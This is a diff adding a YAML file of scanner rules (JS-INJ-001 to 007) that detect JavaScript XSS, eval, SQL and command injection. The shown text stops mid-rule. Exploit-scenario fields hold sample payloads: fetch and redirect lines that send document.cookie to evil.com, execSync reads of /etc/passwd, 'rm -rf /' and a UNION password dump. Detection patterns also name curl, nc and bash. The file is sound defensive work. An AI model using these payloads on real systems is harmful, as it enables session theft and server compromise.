@@ -1,0 +1,1707 @@
+rules:
+
+  # ==========================================================================
+  # JS-INJ-001: innerHTML/outerHTML DOM XSS Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-001
+    title: innerHTML/outerHTML DOM XSS Injection
+    description: >
+      Detects assignment of user-controlled input to innerHTML or outerHTML
+      properties, enabling DOM-based Cross-Site Scripting. These properties
+      parse HTML strings and execute embedded scripts, allowing attackers to
+      inject malicious markup that executes in the victim's browser context.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.93
+    cwe: CWE-79
+    owasp: "A03:2021-Injection"
+    tags:
+      - xss
+      - dom-xss
+      - innerHTML
+      - outerHTML
+      - client-side
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: '\.innerHTML\s*=\s*(?![\x27"`]\s*$)[^;]*(?:req\.|request\.|params\.|query\.|body\.|input|user|data|value|response)'
+        description: "innerHTML assigned from user-controlled variable"
+      - type: regex
+        pattern: '\.outerHTML\s*=\s*[^;]*(?:req\.|request\.|params\.|query\.|body\.|input|user)'
+        description: "outerHTML assigned from user-controlled variable"
+      - type: regex
+        pattern: '\.innerHTML\s*(?:\+|=)\s*[`][^`]*\$\{[^}]*(?:req|request|params|query|body|input|user)[^}]*\}'
+        description: "innerHTML with template literal containing user input"
+      - type: regex
+        pattern: '\.innerHTML\s*=\s*[^;]*\.(?:value|textContent|innerText|getAttribute\s*\()'
+        description: "innerHTML from DOM element value"
+      - type: regex
+        pattern: 'document\.getElementById\s*\([^)]+\)\s*\.innerHTML\s*='
+        description: "Direct element innerHTML assignment"
+      - type: regex
+        pattern: '\.insertAdjacentHTML\s*\(\s*[\x27"][^)]+[\x27"]\s*,\s*[^)]*(?:req|input|user|data|value)'
+        description: "insertAdjacentHTML with user-controlled content"
+    anti_patterns:
+      - 'DOMPurify\.sanitize\s*\('
+      - 'sanitize\s*\('
+      - 'escapeHtml\s*\('
+      - 'textContent\s*='
+      - 'innerText\s*='
+      - '\.innerHTML\s*=\s*[\x27"][\x27"]\s*;'
+      - '\.innerHTML\s*=\s*[\x27"][^${}]*[\x27"]\s*;'
+      - 'createTextNode\s*\('
+      - 'xss\s*\('
+      - 'encode\s*\('
+    bypass_variants:
+      - description: "SVG onload event bypass"
+        pattern: '<svg\s+onload\s*='
+      - description: "IMG onerror bypass"
+        pattern: '<img\s+src\s*=\s*x\s+onerror\s*='
+      - description: "Template injection via backtick"
+        pattern: '`[^`]*\$\{[^}]*\}[^`]*`'
+    evasion_indicators:
+      - "HTML entity encoding to bypass filters"
+      - "JavaScript event handlers in injected HTML"
+      - "SVG/MathML namespace confusion"
+      - "DOM clobbering via injected elements"
+    encoding_variants:
+      - type: "html_entities"
+        pattern: '&(?:#x[0-9a-fA-F]+|#\d+|[a-zA-Z]+);'
+      - type: "unicode_escape"
+        pattern: '\\u[0-9a-fA-F]{4}'
+    multi_function_chain_patterns:
+      - "fetch(url) -> response.text() -> element.innerHTML = text"
+      - "req.query.input -> template literal -> element.innerHTML"
+      - "location.hash -> decode -> innerHTML assignment"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "DOM XSS enables session hijacking, credential theft, and account takeover"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query, req.body, URL parameters"
+        sink: "element.innerHTML"
+        through: "direct assignment or template literal"
+      - source: "location.hash, location.search"
+        sink: "element.innerHTML"
+        through: "URL fragment decoding"
+    impact: |
+      DOM XSS via innerHTML allows attackers to execute arbitrary JavaScript
+      in the victim's browser, enabling session hijacking, credential theft,
+      keylogging, phishing overlays, and cryptocurrency mining.
+    remediation: |
+      - Use textContent or innerText instead of innerHTML for text.
+      - Sanitize HTML with DOMPurify before innerHTML assignment.
+      - Use Content Security Policy headers to mitigate impact.
+      - Use frameworks with automatic escaping (React, Vue, Angular).
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'document\.'
+        - 'getElementById'
+        - 'querySelector'
+        - 'addEventListener'
+      taint_source_indicators:
+        - 'req\.query'
+        - 'req\.body'
+        - 'location\.hash'
+        - 'location\.search'
+        - 'window\.name'
+        - 'document\.referrer'
+      taint_sink_indicators:
+        - '\.innerHTML'
+        - '\.outerHTML'
+        - 'insertAdjacentHTML'
+        - 'document\.write'
+      sanitization_patterns:
+        - 'DOMPurify\.sanitize'
+        - 'escapeHtml'
+        - 'sanitizeHtml'
+        - 'textContent'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A search page displays results by setting innerHTML from the query
+        parameter: element.innerHTML = req.query.q. An attacker sends a URL
+        with q=<img src=x onerror=alert(document.cookie)> to steal cookies.
+      example_payload: "<img src=x onerror='fetch(`https://evil.com/steal?c=`+document.cookie)'>"
+      attacker_objective: "Execute arbitrary JavaScript in victim's browser via DOM XSS"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - JS-INJ-002
+        - JS-INJ-005
+
+  # ==========================================================================
+  # JS-INJ-002: eval() with User Input
+  # ==========================================================================
+  - rule_id: JS-INJ-002
+    title: eval() with User-Controlled Input
+    description: >
+      Detects usage of JavaScript eval() function where the argument may contain
+      user-controlled input. eval() interprets strings as JavaScript code, enabling
+      arbitrary code execution when untrusted data is passed to it.
+    language: javascript
+    category: injection
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-95
+    owasp: "A03:2021-Injection"
+    tags:
+      - code-injection
+      - eval
+      - rce
+      - javascript
+    detection_layer: 1
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)'
+        description: "eval() with request/user input directly"
+      - type: regex
+        pattern: 'eval\s*\(\s*[`][^`]*\$\{[^}]*(?:req|request|params|query|body|input|user)[^}]*\}'
+        description: "eval() with template literal containing user input"
+      - type: regex
+        pattern: 'eval\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|request|params|query|body|input|user)'
+        description: "eval() with string concatenation of user input"
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:JSON\.stringify|decodeURIComponent|atob)\s*\([^)]*(?:req|input|user|data)'
+        description: "eval() with decoded/stringified user input"
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:args|argv|options|config|payload|expression|formula|code)\s*[,\)]'
+        description: "eval() with common variable names for dynamic input"
+    anti_patterns:
+      - 'eval\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
+      - '// eslint-disable.*no-eval'
+      - 'JSON\.parse\s*\('
+      - '// safe: constant'
+      - 'eval\s*\(\s*JSON\.stringify\s*\(\s*\{[\x27"][a-zA-Z]+[\x27"]'
+      - '// nosec'
+      - 'vm\.runInNewContext'
+      - 'test\s*\('
+      - 'describe\s*\('
+    bypass_variants:
+      - description: "Indirect eval via window"
+        pattern: 'window\s*\[\s*[\x27"]eval[\x27"]\s*\]\s*\('
+      - description: "Eval via Function constructor"
+        pattern: 'new\s+Function\s*\(\s*(?:req|input|user|data)'
+      - description: "Eval alias"
+        pattern: '(?:var|let|const)\s+\w+\s*=\s*eval\s*;'
+    evasion_indicators:
+      - "Indirect eval via variable alias"
+      - "window['eval'] property access"
+      - "eval through computed property name"
+    encoding_variants:
+      - type: "base64_decode"
+        pattern: 'eval\s*\(\s*atob\s*\('
+      - type: "hex_decode"
+        pattern: 'eval\s*\(\s*[^)]*\\x[0-9a-fA-F]{2}'
+    multi_function_chain_patterns:
+      - "req.body.expression -> eval(expression)"
+      - "req.query.formula -> decodeURIComponent -> eval"
+      - "WebSocket message -> JSON.parse -> eval(msg.code)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Arbitrary JavaScript code execution on server or client"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.expression"
+        sink: "eval()"
+        through: "direct parameter passing"
+      - source: "req.query.code"
+        sink: "eval()"
+        through: "query string extraction"
+    impact: |
+      Arbitrary JavaScript code execution enabling RCE on Node.js servers,
+      data exfiltration, credential theft, and full system compromise. On
+      client-side, enables complete session takeover.
+    remediation: |
+      - Never use eval() with user input. Use JSON.parse() for JSON.
+      - Use safe expression evaluators (mathjs, expr-eval).
+      - Implement Content Security Policy with script-src restrictions.
+      - Use vm2 or isolated-vm for sandboxed code execution.
+    references:
+      - "https://cwe.mitre.org/data/definitions/95.html"
+      - "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'require\s*\('
+        - 'module\.exports'
+        - 'app\.\w+\s*\('
+        - 'router\.\w+\s*\('
+      taint_source_indicators:
+        - 'req\.body'
+        - 'req\.query'
+        - 'req\.params'
+        - 'process\.argv'
+      taint_sink_indicators:
+        - 'eval\s*\('
+        - 'Function\s*\('
+        - 'vm\.runInThisContext'
+      sanitization_patterns:
+        - 'JSON\.parse'
+        - 'parseInt'
+        - 'parseFloat'
+        - 'allowlist'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A calculator API evaluates user expressions via eval(req.body.expr).
+        Attacker sends expr=require('child_process').execSync('cat /etc/passwd')
+        to execute OS commands on the server.
+      example_payload: "require('child_process').execSync('id').toString()"
+      attacker_objective: "Achieve remote code execution via eval injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - JS-INJ-003
+        - JS-INJ-004
+
+  # ==========================================================================
+  # JS-INJ-003: Function Constructor Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-003
+    title: Function Constructor Injection
+    description: >
+      Detects use of the Function constructor with user-controlled strings.
+      new Function(code) is equivalent to eval() and executes arbitrary
+      JavaScript. Attackers can inject code through function body arguments.
+    language: javascript
+    category: injection
+    severity: Critical
+    confidence: 0.94
+    cwe: CWE-95
+    owasp: "A03:2021-Injection"
+    tags: [code-injection, function-constructor, rce, javascript]
+    detection_layer: 1
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'new\s+Function\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data|code|expr)'
+        description: "Function constructor with user-controlled argument"
+      - type: regex
+        pattern: 'new\s+Function\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user|data)[^}]*\}'
+        description: "Function constructor with template literal user input"
+      - type: regex
+        pattern: 'new\s+Function\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user|data)'
+        description: "Function constructor with concatenated user input"
+      - type: regex
+        pattern: 'Function\s*\(\s*(?:\.\.\.args|arguments|code|body|script)\s*\)'
+        description: "Function constructor with dynamic arguments"
+    anti_patterns:
+      - 'new\s+Function\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
+      - '// safe: constant'
+      - 'test\s*\('
+      - 'describe\s*\('
+      - '// eslint-disable'
+      - 'Function\.prototype'
+    bypass_variants:
+      - description: "Indirect Function via constructor property"
+        pattern: '(?:\[\]|{})\.constructor\.constructor\s*\('
+      - description: "Function via generator"
+        pattern: 'function\s*\*\s*\(\s*\)\s*\{\s*\}\.constructor\s*\('
+    evasion_indicators:
+      - "Indirect Function access via constructor chain"
+      - "Generator function constructor bypass"
+    encoding_variants:
+      - type: "base64_decode"
+        pattern: 'new\s+Function\s*\(\s*atob\s*\('
+      - type: "unicode"
+        pattern: 'new\s+Function\s*\(\s*[^)]*\\u[0-9a-fA-F]{4}'
+    multi_function_chain_patterns:
+      - "req.body.code -> new Function(code) -> fn()"
+      - "WebSocket data -> Function(data) -> execute"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Arbitrary code execution equivalent to eval()"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.code"
+        sink: "new Function(code)"
+        through: "direct parameter passing"
+    impact: |
+      Function constructor injection enables arbitrary JavaScript execution,
+      identical to eval() in impact. On Node.js, this leads to full RCE.
+    remediation: |
+      - Never pass user input to new Function().
+      - Use safe expression parsers (mathjs, expr-eval).
+      - Apply CSP headers to restrict inline script execution.
+    references:
+      - "https://cwe.mitre.org/data/definitions/95.html"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(', 'module\.exports', 'app\.']
+      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params']
+      taint_sink_indicators: ['new\s+Function', 'Function\s*\(']
+      sanitization_patterns: ['JSON\.parse', 'allowlist', 'validate']
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A template engine uses new Function('data', userTemplate) to compile
+        templates. Attacker provides template containing process.exit() or
+        require('child_process').exec('rm -rf /').
+      example_payload: "return require('child_process').execSync('whoami').toString()"
+      attacker_objective: "Execute arbitrary code via Function constructor"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-002, JS-INJ-004]
+
+  # ==========================================================================
+  # JS-INJ-004: setTimeout/setInterval String Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-004
+    title: setTimeout/setInterval String Argument Injection
+    description: >
+      Detects setTimeout or setInterval called with a string argument containing
+      user input. When passed a string, these functions evaluate it as code,
+      equivalent to eval().
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.91
+    cwe: CWE-95
+    owasp: "A03:2021-Injection"
+    tags: [code-injection, setTimeout, setInterval, javascript]
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'setTimeout\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)'
+        description: "setTimeout with user-controlled string"
+      - type: regex
+        pattern: 'setInterval\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)'
+        description: "setInterval with user-controlled string"
+      - type: regex
+        pattern: 'setTimeout\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user)[^}]*\}'
+        description: "setTimeout with template literal user input"
+      - type: regex
+        pattern: 'setTimeout\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user)'
+        description: "setTimeout with concatenated user input"
+    anti_patterns:
+      - 'setTimeout\s*\(\s*(?:function|\(\)|=>)'
+      - 'setTimeout\s*\(\s*\w+\s*,\s*\d+\s*\)'
+      - 'setInterval\s*\(\s*(?:function|\(\)|=>)'
+      - 'setTimeout\s*\(\s*[\x27"][^${}]+[\x27"]\s*,'
+      - 'test\s*\('
+      - '// safe'
+    bypass_variants:
+      - description: "setTimeout via window property"
+        pattern: 'window\s*\[\s*[\x27"]setTimeout[\x27"]\s*\]'
+      - description: "Encoded string to setTimeout"
+        pattern: 'setTimeout\s*\(\s*atob\s*\('
+    evasion_indicators:
+      - "String argument to timer functions"
+      - "Indirect access via window property"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'setTimeout\s*\(\s*atob\s*\('
+      - type: "url_encoding"
+        pattern: 'setTimeout\s*\(\s*decodeURIComponent\s*\('
+    multi_function_chain_patterns:
+      - "req.query.callback -> setTimeout(callback, 0)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Code execution via timer function string evaluation"
+    business_logic_indicator:
+      financial_impact: false
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query.callback"
+        sink: "setTimeout(callback)"
+        through: "direct string pass"
+    impact: |
+      Arbitrary JavaScript execution via timer functions when string arguments
+      are used instead of function references. Enables XSS and session hijacking.
+    remediation: |
+      - Always pass function references to setTimeout/setInterval, never strings.
+      - Use arrow functions: setTimeout(() => action(), delay).
+      - Enable ESLint no-implied-eval rule.
+    references:
+      - "https://cwe.mitre.org/data/definitions/95.html"
+    context_awareness:
+      surrounding_context_patterns: ['document\.', 'window\.']
+      taint_source_indicators: ['req\.query', 'location\.', 'window\.name']
+      taint_sink_indicators: ['setTimeout\s*\(', 'setInterval\s*\(']
+      sanitization_patterns: ['typeof.*function', 'allowlist']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A notification system uses setTimeout(req.query.action, 1000) to
+        schedule callbacks. Attacker sets action=alert(document.cookie).
+      example_payload: "fetch('https://evil.com/'+document.cookie)"
+      attacker_objective: "Execute JavaScript via timer string evaluation"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-002, JS-INJ-003]
+
+  # ==========================================================================
+  # JS-INJ-005: document.write Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-005
+    title: document.write DOM Injection
+    description: >
+      Detects document.write() or document.writeln() with user-controlled input.
+      These functions directly inject HTML into the page, enabling DOM XSS when
+      unsanitized user data is included.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.92
+    cwe: CWE-79
+    owasp: "A03:2021-Injection"
+    tags: [xss, dom-xss, document-write, javascript]
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'document\.write(?:ln)?\s*\(\s*[^)]*(?:req\.|request\.|params\.|query\.|body\.|input|user|data|value)'
+        description: "document.write with user-controlled variable"
+      - type: regex
+        pattern: 'document\.write(?:ln)?\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user|location|document\.referrer)[^}]*\}'
+        description: "document.write with template literal user input"
+      - type: regex
+        pattern: 'document\.write(?:ln)?\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:location|document\.referrer|window\.name)'
+        description: "document.write with DOM-based taint sources"
+      - type: regex
+        pattern: 'document\.write(?:ln)?\s*\(\s*(?:decodeURIComponent|unescape)\s*\('
+        description: "document.write with URL-decoded content"
+    anti_patterns:
+      - 'document\.write\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
+      - 'DOMPurify\.sanitize'
+      - 'escapeHtml'
+      - '// safe: static'
+      - 'document\.write\s*\(\s*[\x27"]<script'
+      - 'test\s*\('
+    bypass_variants:
+      - description: "document.write via document['write']"
+        pattern: 'document\s*\[\s*[\x27"]write[\x27"]\s*\]\s*\('
+      - description: "Write after DOM load"
+        pattern: 'document\.open\s*\(\s*\)[^;]*document\.write'
+    evasion_indicators:
+      - "Indirect document.write via bracket notation"
+      - "document.open before write to replace entire page"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: 'document\.write\s*\(\s*decodeURIComponent'
+      - type: "html_entities"
+        pattern: 'document\.write\s*\(\s*[^)]*&#'
+    multi_function_chain_patterns:
+      - "location.search -> decodeURIComponent -> document.write"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "DOM XSS via document.write enables script injection"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "location.search, location.hash"
+        sink: "document.write()"
+        through: "URL parameter extraction"
+    impact: |
+      document.write with user input enables DOM-based XSS, allowing attackers
+      to inject scripts, steal credentials, and hijack sessions.
+    remediation: |
+      - Avoid document.write(); use DOM manipulation APIs instead.
+      - Sanitize content with DOMPurify before writing.
+      - Use textContent for text-only output.
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+    context_awareness:
+      surrounding_context_patterns: ['document\.', '<script']
+      taint_source_indicators: ['location\.search', 'location\.hash', 'document\.referrer']
+      taint_sink_indicators: ['document\.write', 'document\.writeln']
+      sanitization_patterns: ['DOMPurify\.sanitize', 'escapeHtml', 'textContent']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A page uses document.write(decodeURIComponent(location.search)) to
+        render search terms. Attacker crafts URL with ?<script>alert(1)</script>.
+      example_payload: "<script>document.location='https://evil.com/?c='+document.cookie</script>"
+      attacker_objective: "Inject HTML/JavaScript via document.write"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-001, JS-INJ-002]
+
+  # ==========================================================================
+  # JS-INJ-006: Template Literal SQL Injection (Node.js)
+  # ==========================================================================
+  - rule_id: JS-INJ-006
+    title: Template Literal SQL Injection in Node.js
+    description: >
+      Detects SQL queries constructed using template literals or string
+      concatenation with user-controlled input in Node.js applications.
+      This enables SQL injection attacks against backend databases.
+    language: javascript
+    category: injection
+    severity: Critical
+    confidence: 0.93
+    cwe: CWE-89
+    owasp: "A03:2021-Injection"
+    tags: [sql-injection, template-literal, nodejs, database]
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '(?:query|execute|raw)\s*\(\s*`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^`]*\$\{[^}]*(?:req|request|params|query|body|input|user)[^}]*\}'
+        description: "SQL query with template literal containing user input"
+      - type: regex
+        pattern: '(?:query|execute|raw)\s*\(\s*[\x27"][^)]*(?:SELECT|INSERT|UPDATE|DELETE)\b[^)]*[\x27"]\s*\+\s*(?:req|request|params|query|body|input|user)'
+        description: "SQL query with string concatenation of user input"
+      - type: regex
+        pattern: '(?:db|connection|pool|client|knex|sequelize|prisma)\s*\.(?:query|raw|execute)\s*\(\s*`[^`]*\$\{'
+        description: "Database client query with interpolated variables"
+      - type: regex
+        pattern: '`\s*(?:SELECT|INSERT|UPDATE|DELETE)\b[^`]*WHERE\b[^`]*\$\{[^}]*(?:req|params|body|query)\.'
+        description: "SQL WHERE clause with template literal user input"
+      - type: regex
+        pattern: '(?:sequelize|knex|typeorm)\s*\.(?:query|raw)\s*\(\s*[\x27"`].*\+\s*\w+'
+        description: "ORM raw query with string concatenation"
+    anti_patterns:
+      - '\.query\s*\(\s*[\x27"][^${}]+[\x27"]\s*,\s*\['
+      - 'parameterized'
+      - 'prepared\s*statement'
+      - '\.query\s*\(\s*[\x27"][^${}]*\?\s*[\x27"]\s*,'
+      - 'knex\s*\(\s*[\x27"]\w+[\x27"]\s*\)\s*\.where'
+      - 'sequelize\s*\.escape'
+      - 'sanitize'
+      - 'test\s*\('
+    bypass_variants:
+      - description: "Second-order SQL injection via stored data"
+        pattern: '(?:query|execute)\s*\(\s*`[^`]*\$\{.*(?:stored|cached|saved|db)\.'
+      - description: "SQL injection via ORDER BY"
+        pattern: '`[^`]*ORDER\s+BY\s+\$\{'
+    evasion_indicators:
+      - "Template literal injection in SQL"
+      - "String concatenation in ORM raw queries"
+      - "ORDER BY/GROUP BY injection"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: '\\u0027|\\u0022'
+      - type: "hex_escape"
+        pattern: '\\x27|\\x22'
+    multi_function_chain_patterns:
+      - "req.query.id -> template literal -> db.query(sql)"
+      - "req.body.search -> string concat -> connection.execute"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "SQL injection enables data theft, modification, and potential RCE via DB features"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query.id, req.body.search"
+        sink: "db.query(sql)"
+        through: "template literal or string concatenation"
+    impact: |
+      SQL injection allows attackers to read, modify, or delete database
+      records, bypass authentication, and potentially execute OS commands
+      via database-specific features.
+    remediation: |
+      - Use parameterized queries: db.query('SELECT * WHERE id = ?', [id]).
+      - Use ORM query builders (Knex, Sequelize, TypeORM) instead of raw SQL.
+      - Validate and sanitize all user input used in queries.
+    references:
+      - "https://cwe.mitre.org/data/definitions/89.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"](?:mysql|pg|sqlite|mssql)', 'knex', 'sequelize']
+      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params']
+      taint_sink_indicators: ['\.query\s*\(', '\.execute\s*\(', '\.raw\s*\(']
+      sanitization_patterns: ['parameterized', '\.escape\s*\(', 'prepared']
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Node.js API uses db.query(`SELECT * FROM users WHERE id = ${req.params.id}`).
+        Attacker sends id=1 UNION SELECT password FROM admin_users-- to dump admin passwords.
+      example_payload: "1 UNION SELECT username, password FROM users--"
+      attacker_objective: "Extract sensitive data from the database via SQL injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules: [JS-INJ-010, JS-INJ-015]
+
+  # ==========================================================================
+  # JS-INJ-007: child_process.exec Command Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-007
+    title: child_process.exec Command Injection
+    description: >
+      Detects command injection via Node.js child_process.exec, execSync, or
+      spawn with shell:true where user-controlled input is passed as part of
+      the command string. exec() passes the command through a shell interpreter,
+      enabling injection of shell metacharacters for arbitrary command execution.
+    language: javascript
+    category: injection
+    severity: Critical
+    confidence: 0.96
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags: [command-injection, child-process, rce, nodejs, os-command]
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '(?:exec|execSync)\s*\(\s*[`][^`]*\$\{[^}]*(?:req|request|params|query|body|input|user|filename|path|cmd)[^}]*\}'
+        description: "exec with template literal containing user input"
+      - type: regex
+        pattern: '(?:exec|execSync)\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|request|params|query|body|input|user|filename|path)'
+        description: "exec with string concatenation of user input"
+      - type: regex
+        pattern: 'child_process\s*\.\s*(?:exec|execSync|execFile)\s*\(\s*(?:req|request|params|query|body|input|user|cmd|command)'
+        description: "child_process.exec with user-controlled command"
+      - type: regex
+        pattern: 'spawn\s*\(\s*[\x27"][^)]*[\x27"]\s*,\s*\[[^\]]*(?:req|input|user|data)\.'
+        description: "spawn with user-controlled arguments"
+      - type: regex
+        pattern: 'spawn\s*\(\s*[^,]+,\s*[^,]+,\s*\{[^}]*shell\s*:\s*true'
+        description: "spawn with shell:true option"
+    anti_patterns:
+      - 'exec\s*\(\s*[\x27"][^${}]+[\x27"]\s*[,\)]'
+      - 'execFile\s*\('
+      - 'spawn\s*\(\s*[\x27"][^)]*[\x27"]\s*,\s*\[[^\]]*[\x27"][^${}]*[\x27"]'
+      - 'shell\s*:\s*false'
+      - 'sanitize'
+      - 'escapeshellarg'
+      - 'shellescape'
+      - 'test\s*\('
+    bypass_variants:
+      - description: "Command injection via semicolon"
+        pattern: ';[^;]*(?:cat|ls|wget|curl|nc|bash)\s+'
+      - description: "Injection via backtick substitution"
+        pattern: '`[^`]*(?:cat|ls|wget|curl|nc|bash)'
+      - description: "Pipe injection"
+        pattern: '\|[^|]*(?:sh|bash|python|perl|ruby)'
+    evasion_indicators:
+      - "Shell metacharacter injection (; | & ` $())"
+      - "Encoded shell commands"
+      - "Newline injection in command"
+    encoding_variants:
+      - type: "hex_encoded_commands"
+        pattern: '\\x[0-9a-fA-F]{2}'
+      - type: "base64_encoded"
+        pattern: 'echo\s+[A-Za-z0-9+/=]+\s*\|\s*base64\s+-d'
+    multi_function_chain_patterns:
+      - "req.query.filename -> exec('convert ' + filename)"
+      - "req.body.host -> execSync('ping ' + host)"
+    privilege_context_flags:
